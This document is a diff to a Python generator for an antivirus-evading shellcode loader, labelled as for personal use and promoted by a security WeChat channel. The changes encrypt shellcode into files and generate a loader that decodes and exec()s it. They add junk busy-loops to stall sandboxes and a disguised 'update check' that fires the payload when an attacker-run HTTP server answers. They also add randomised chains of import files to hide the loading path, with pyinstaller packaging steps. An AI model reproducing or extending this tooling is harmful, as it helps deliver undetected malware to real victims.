@@ -1,20 +1,62 @@
 import base64
 import random
 import os
+import string
 
+print("-------------------")
+print("关注微信公众号'知攻善防实验室'持续更新")
+print("-------------------")
 print("自用免杀")
 print("测试环境:Python3.8.0")
-print("请在运行结束后运行pyinstaller -F -w loader.py")
-IPserver = input("请输入HTTP服务器ip:")
-ShellCode = '请将shellcode放入1.txt'
+print("打包教程(单文件无命令提示符):pyinstaller -F -w loader.py")
+print("打包教程(单文件有命令提示符):pyinstaller -F loader.py")
+print("-------------------------------")
+IPserver = input("请输入HTTP服务器ip: ")
+print("-------------------------------")
+ShellCode = '请将shellcode放入file/1.txt'
+print("-------------------------------")
 print("完成请回车")
 os.system("pause")
 
 
 
+
 # 读取文件内容
-with open('1.txt', 'rb') as file:
+with open('shellcode.txt', 'rb') as file:
     file_content = file.read()
+
+
+def delete_files_in_directory(directory):
+    # 检查目录是否存在
+    if os.path.exists(directory):
+        # 获取目录中的所有文件和子目录
+        files = os.listdir(directory)
+        
+        for file in files:
+            # 构建文件的完整路径
+            file_path = os.path.join(directory, file)
+            
+            # 判断是否为文件，而不是子目录
+            if os.path.isfile(file_path):
+                # 删除文件
+                os.remove(file_path)
+                print(f"已删除文件: {file_path}")
+            else:
+                print(f"跳过子目录: {file_path}")
+    else:
+        print(f"目录不存在: {directory}")
+delete_files_in_directory("file")
+
+
+
+def generate_random_string(length):
+    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
+
+# 生成一个包含5个字符的随机字符串
+random_string = generate_random_string(8)
+print("随机字符串:", random_string) # 产生随机字符串作为嵌套文件名
+random2 = generate_random_string(5)
+
 
 # 对内容进行Base64编码
 encoded_content = base64.b64encode(file_content).decode('utf-8')
@@ -167,14 +209,14 @@ def encode(text):
   
     return miwen1
 zuihou = encode(aes)
-with open("miwen.txt",'w') as f:
+with open("file/miwen.txt",'w') as f:
     f.write(zuihou)
     print("miwen.txt生成完毕")
 # miwen.txt生成完毕
 
 
 # 生成无效文件
-with open("kygvseedc.txt",'w') as f:
+with open("file/kygvseedc.txt",'w') as f:
     f.write("")
 print("kygvseedc.txt生成完毕")
 
@@ -294,7 +336,7 @@ def decodemaba(miwen):
     return mingwen
 
 def run_if_statements():
-    for _ in range(1000000000):
+    for _ in range(1000000):
         if True:  # 在这里放入你的条件
             pass
 def decrypt(encrypted_text, key):
@@ -395,11 +437,11 @@ encoded_content = encode_to_base64(content)
 # 打印编码后的内容
 # print("编码后的内容:")
 # print(encoded_content)
-with open("fenli.txt",'w') as f:
+with open("file/fenli.txt",'w') as f:
     f.write(encoded_content)
 
 # 生成loaderSSSSS.py
-with open("loaderSSSSS.py",'w') as f:
+with open("file/loaderSSSSS.py",'w') as f:
     f.write(f'''
 
 import os
@@ -418,7 +460,7 @@ i = 0
 
 def SySTemcyfgbgbrsvfnbsdgrjkfenesjlkfg():
     global i
-    while i < 100000000:
+    while i < 100000:
         ahtdfvghsrybsfnkmarsudfhacsnjldkgfnvklasr()
     
 
@@ -443,7 +485,7 @@ exec(code)
 print("loaderSSSSS.py生成完毕")
 
 # 
-with open("loader.py",'w',encoding='utf-8') as f:
+with open("file/loader.py",'w',encoding='utf-8') as f:
     f.write(f'''
             
 import tkinter as tk
@@ -454,7 +496,7 @@ def CheckUpdate():
     if res.text == '存在更新':
         
         print("存在更新")
-        import l1
+        import {random_string}0
     else:
         print(res.text)
         print("不存在更新")
@@ -494,32 +536,44 @@ CheckUpdate()
 
 print("loader.py生成完毕")
 
-with open("l1.py",'w',encoding='utf-8') as f:
-    f.write(f'''
-import l2
-''')
+# 生成加载器文件
 
-print("l1.py生成完毕")
 
-with open("l2.py",'w',encoding='utf-8') as f:
-    f.write(f'''
-import l3
-''')
-    
-print("l2.py生成完毕")
+# 生成update文件
+with open("file/update.txt",'w',encoding='utf-8') as f:
+    f.write("存在更新")
 
-with open("l3.py",'w',encoding='utf-8') as f:
-    f.write(f'''
-import l4
-''')
-    
-print("l3.py生成完毕")
 
-with open("l4.py",'w',encoding='utf-8') as f:
-    f.write(f'''
-import loaderSSSSS
-''')
-    
-print("l3.py生成完毕")
+nums = random.randint(1, 50)
+print(f"获取到的随机数{nums}")
+i=0
+while i<nums:
+    with open(f"file/{random_string}{i}.py",'w') as f :
+        f.write(f"import {random_string}{i+1}")
+    i=i+1
+
+with open(f"file/{random_string}{nums-1}.py",'w') as f:
+    print(f"结尾文件{nums-1}")
+    f.write(f"import loaderSSSSS")
+
+# 生成结束
+
+nums = random.randint(1, 50)
+print(f"获取到的随机0数{nums}")
+i=0
+while i<nums:
+    with open(f"file/{random2}{i}.py",'w') as f :
+        f.write(f"import {random2}{i+1}")
+    i=i+1
+
+with open(f"file/{random2}{nums-1}.py",'w') as f:
+    print(f"结尾文件{nums-1}")
+    f.write(f"import loader")
+
+
+
+
+
 
 print("免杀生成完毕！")
+print(f"打包命令:\npyinstaller -F -w {random2}0.py")
